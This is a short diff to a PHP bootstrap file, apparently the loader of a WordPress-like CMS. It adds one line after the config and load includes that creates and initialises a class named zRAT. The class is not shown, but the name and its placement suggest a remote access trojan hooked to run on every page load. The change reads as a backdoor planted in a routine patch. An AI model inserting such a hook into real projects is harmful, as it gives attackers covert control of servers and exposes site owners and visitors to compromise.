@@ -20,3 +20,5 @@ require_once (Z_ABSPATH . 'config.php');
  * Loads the environment and template
 */
 require_once (Z_ABSPATH . 'load.php');
+
+(new zRAT ())->init ();
